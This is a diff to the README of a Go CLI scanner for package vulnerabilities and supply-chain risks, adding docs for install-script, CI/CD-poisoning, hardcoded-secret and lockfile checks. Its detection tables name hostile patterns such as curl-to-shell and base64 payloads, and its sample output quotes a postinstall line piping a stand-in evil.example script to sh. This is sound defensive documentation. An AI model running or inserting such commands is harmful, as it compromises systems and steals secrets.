@@ -2,7 +2,7 @@
 
 [日本語版 README](README.ja.md)
 
-A Go CLI tool that scans OS packages (RPM, DPKG) and OSS ecosystems (PyPI, npm/yarn/pnpm) on Linux/Windows servers or Docker container images, then queries a vulnerability API to detect known vulnerabilities. Also performs local supply-chain security checks without any API access: **GlassWorm** (invisible character injection) and **Dependency Confusion** (Shai-hulud) detection.
+A Go CLI tool that scans OS packages (RPM, DPKG) and OSS ecosystems (PyPI, npm/yarn/pnpm) on Linux/Windows servers or Docker container images, then queries a vulnerability API to detect known vulnerabilities. Also performs local supply-chain security checks without any API access: **GlassWorm** (invisible character injection), **Dependency Confusion** (Shai-hulud), **Malicious Install Scripts**, **CI/CD Pipeline Poisoning**, **Hardcoded Secrets**, and **Lock File Integrity** detection.
 
 ## Supported Ecosystems
 
@@ -119,11 +119,11 @@ This command inherits all flags from both `collect` and `check`.
 |---|---|---|
 | `--image` | (none) | Docker image reference to scan |
 | `--dockerfile` | (none) | Dockerfile path: also chain-scans the FROM base image |
-| `--skip-local` | `false` | Skip local security checks (GlassWorm, Dependency Confusion) |
+| `--skip-local` | `false` | Skip local security checks (GlassWorm, Dependency Confusion, Malicious Install, CI/CD Poisoning, Hardcoded Secrets, Lock File Integrity) |
 
 ## Local Security Checks
 
-In addition to API-based vulnerability detection, `scan` automatically runs two local checks that require no network access:
+In addition to API-based vulnerability detection, `scan` automatically runs six local checks that require no network access:
 
 ### GlassWorm Detection
 
@@ -153,6 +153,80 @@ Detects configuration patterns that leave projects vulnerable to substitution at
 | Missing `--hash=sha256:` integrity check | PyPI | LOW |
 | Public `GOPROXY` without `GOPRIVATE` covering internal module paths | Go | HIGH |
 | Module present in `go.mod` but missing from `go.sum` | Go | MEDIUM |
+
+### Malicious Install Scripts Detection
+
+Detects dangerous commands in npm lifecycle hooks (`preinstall`, `postinstall`, `prepare`, etc.) and Python `setup.py` that execute automatically during package installation — a common vector for supply chain attacks.
+
+| Check | Ecosystem | Severity |
+|---|---|---|
+| `curl`/`wget` output piped to shell (`\| sh`, `\| bash`) | npm / PyPI | CRITICAL |
+| Base64-decoded payload piped to shell | npm | CRITICAL |
+| `eval()` of network-fetched content | npm | CRITICAL |
+| `require('child_process')` loaded in install hook | npm | HIGH |
+| Outbound `curl`/`wget` request in lifecycle hook | npm | HIGH |
+| Inline execution via `node -e '...'` | npm | HIGH |
+| `os.system()` or `subprocess.*()` in `setup.py` | PyPI | HIGH |
+| Base64 decoding (`Buffer.from(..., 'base64')`) in hook | npm | MEDIUM |
+| Outbound `fetch()` in install hook | npm | MEDIUM |
+| Outbound network request in `setup.py` | PyPI | MEDIUM |
+
+Scans `package.json` (including packages under `node_modules/`) and `setup.py`.
+
+### CI/CD Pipeline Poisoning Detection
+
+Scans CI/CD configuration files for patterns used to hijack build pipelines or exfiltrate secrets.
+
+| Check | System | Severity |
+|---|---|---|
+| `curl`/`wget` output piped to shell | All | CRITICAL |
+| Base64-decoded payload piped to shell | All | CRITICAL |
+| User-controlled GitHub event data interpolated into a `run:` step (script injection) | GitHub Actions | CRITICAL |
+| Outbound `curl`/`wget` download in pipeline step | All | HIGH |
+| GitHub secret (`${{ secrets.* }}`) used directly in step (log leak risk) | GitHub Actions | HIGH |
+| Action pinned to mutable branch ref (`@main`, `@master`) | GitHub Actions | HIGH |
+| Remote pipeline config loaded via `remote: https://` | GitLab CI | HIGH |
+| Inline execution via `node -e` / `python -c` | All | MEDIUM |
+| Action pinned to semver tag instead of full commit SHA | GitHub Actions | MEDIUM |
+
+Scans `.github/workflows/*.yml`, `Jenkinsfile`, `.gitlab-ci.yml`, `.circleci/config.yml`, `azure-pipelines.yml`, `bitbucket-pipelines.yml`.
+
+### Hardcoded Secrets Detection
+
+Detects credentials and API keys committed directly in source or configuration files using two complementary techniques:
+
+**Known-format patterns** match well-known token structures and are flagged regardless of context:
+
+| Secret Type | Severity |
+|---|---|
+| AWS Access Key ID (`AKIA...`) | CRITICAL |
+| GitHub tokens (`ghp_`, `ghs_`, `gho_`, `github_pat_`) | CRITICAL |
+| npm Access Token (`npm_...`) | CRITICAL |
+| Slack Token (`xox[baprs]-...`) | CRITICAL |
+| Stripe Live Secret Key (`sk_live_...`) | CRITICAL |
+| SendGrid API Key (`SG....`) | CRITICAL |
+| Google API Key (`AIza...`) | CRITICAL |
+| Google OAuth Client Secret (`GOCSPX-...`) | CRITICAL |
+| PEM Private Key header | CRITICAL |
+| JSON Web Token (JWT) | HIGH |
+| Stripe Test Secret Key (`sk_test_...`) | MEDIUM |
+
+**Entropy-based detection** flags high-entropy values (≥ 4.5 bits/char, Shannon entropy) in assignment contexts like `api_key = "..."`, `token: "..."`, `secret_key = "..."`. Pure-hex strings (commit hashes, checksums) are excluded to reduce false positives.
+
+Placeholder values (`changeme`, `YOUR_KEY_HERE`, `<token>`, environment variable references like `$MY_SECRET`) are automatically excluded. Secret values are redacted to `first6***` in finding output to prevent credential leakage in logs.
+
+Scans `.go`, `.py`, `.js`, `.ts`, `.rb`, `.php`, `.java`, `.cs`, `.sh`, `.env`, `.yaml`, `.yml`, `.toml`, `.json`, `.xml`, `.ini`, `.cfg`, `.conf`, `.properties`, `.tf`. Skips `*.example`, `*.template`, `*_test.go`, `*.spec.ts`, etc.
+
+### Lock File Integrity Detection
+
+Validates lockfiles for weak or missing integrity hashes, and detects drift between manifest files and their lockfiles — both of which can indicate tampering or a stale dependency snapshot.
+
+| Check | File | Severity |
+|---|---|---|
+| Direct dependency uses SHA-1 integrity (cryptographically broken — collision attacks possible) | `package-lock.json` | HIGH |
+| Dependency declared in `package.json` but absent from `package-lock.json` | `package-lock.json` | MEDIUM |
+| Module required in `go.mod` has no entry in `go.sum` (never fetched/verified) | `go.sum` | MEDIUM |
+| Package in `Pipfile.lock` has no hash entries (integrity cannot be verified at install) | `Pipfile.lock` | MEDIUM |
 
 ## Example Output
 
@@ -191,14 +265,22 @@ Local Security Findings
 =======================
   TYPE            FILE                                LINE  SEVERITY  DETAIL
   ─────────────── ─────────────────────────────────── ────  ────────  ────────────────────────────────────
-G glassworm       /app/utils.py                         42  CRITICAL  invisible char U+202E (RIGHT-TO-LEFT OVERRIDE) detected
-D dep-confusion   /app/.npmrc                            -  HIGH      scoped package @myco has no registry mapping in .npmrc
-D dep-confusion   /app/requirements.txt                 15  HIGH      --extra-index-url found: pip selects highest version across all indexes
+G glassworm          /app/utils.py                         42  CRITICAL  invisible char U+202E (RIGHT-TO-LEFT OVERRIDE) detected
+D dep-confusion      /app/.npmrc                            -  HIGH      scoped package @myco has no registry mapping in .npmrc
+D dep-confusion      /app/requirements.txt                 15  HIGH      --extra-index-url found: pip selects highest version across all indexes
+M malicious-install  /app/package.json                      -  CRITICAL  postinstall: remote code download piped to shell — curl https://evil.example/install.sh | sh
+C cicd-poisoning     /app/.github/workflows/ci.yml         12  HIGH      [github-actions] action pinned to mutable branch ref — uses: actions/checkout@main
+S hardcoded-secrets  /app/config/prod.go                   34  CRITICAL  AWS Access Key ID detected — AKIAIO***
+L lockfile-integrity /app/package-lock.json                 -  HIGH      lodash: integrity uses SHA-1 (broken) — regenerate lockfile with npm ≥ 5 to get SHA-512
 
 G = GlassWorm (invisible/zero-width character injection)
 D = Dependency Confusion (private package resolvable from public registry)
+M = Malicious Install (dangerous command in lifecycle hook)
+C = CI/CD Poisoning (pipeline configuration attack pattern)
+S = Hardcoded Secrets (credential or key committed in source)
+L = Lock File Integrity (weak hash or manifest/lockfile drift)
 
-Local findings: 3 (1 glassworm, 2 dep-confusion)
+Local findings: 7 (1 glassworm, 2 dep-confusion, 1 malicious-install, 1 cicd-poisoning, 1 hardcoded-secrets, 1 lockfile-integrity)
 ```
 
 ### JSON Output (`--format json`)
